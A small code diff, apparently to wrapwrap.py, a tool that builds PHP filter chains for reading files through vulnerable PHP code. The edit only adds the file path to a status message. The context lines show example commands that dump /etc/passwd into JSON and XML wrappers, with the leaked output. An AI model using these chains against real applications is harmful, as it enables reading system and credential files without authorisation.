@@ -25,7 +25,7 @@ or:
 To solve the first example:
 
     $ ./wrapwrap.py /etc/passwd '{"message":"' '"}' 200
-    [*] Dumping 207 bytes.
+    [*] Dumping 207 bytes from /etc/passwd.
     [+] Wrote filter chain to chain.txt (size=152464).
     $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
     {"message":"root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/sbin/nologin=0Asys:x:3:3:sys:/dev:/usr/sbin/nologin=0Async:x:4:65534:sync:/bin:/bin/sync=0Agames:x:"}
@@ -33,7 +33,7 @@ To solve the first example:
 To solve the second example:
 
     $ ./wrapwrap.py /etc/passwd '<movies><movie><plot>' '</plot></movie></movies>' 100
-    [*] Dumping 108 bytes.
+    [*] Dumping 108 bytes from /etc/passwd.
     [+] Wrote filter chain to chain.txt (size=88781).
     $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
     <root><test>root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/</test></root>
@@ -67,8 +67,8 @@ class Generator:
 
     Example:
 
-        $ ./wrapwrap.py /etc/passwd '<root><test>' '</test></root>' 200
-        [*] Dumping 108 bytes.
+        $ ./wrapwrap.py /etc/passwd '<root><test>' '</test></root>' 100
+        [*] Dumping 108 bytes from /etc/passwd.
         [+] Wrote filter chain to chain.txt (size=88781).
         $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
         <root><test>root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/</test></root>
@@ -98,7 +98,7 @@ class Generator:
     def compute_nb_chunks(self) -> None:
         real_stop = self.align_value(self.nb_bytes, 9)
         self.nb_chunks = int(real_stop / 9 * 4)
-        msg_info(f"Dumping [i]{real_stop}[/] bytes.")
+        msg_info(f"Dumping [i]{real_stop}[/] bytes from [b]{self.path}[/].")
 
     def __truediv__(self, filters: str) -> None:
         self.filters.append(filters)
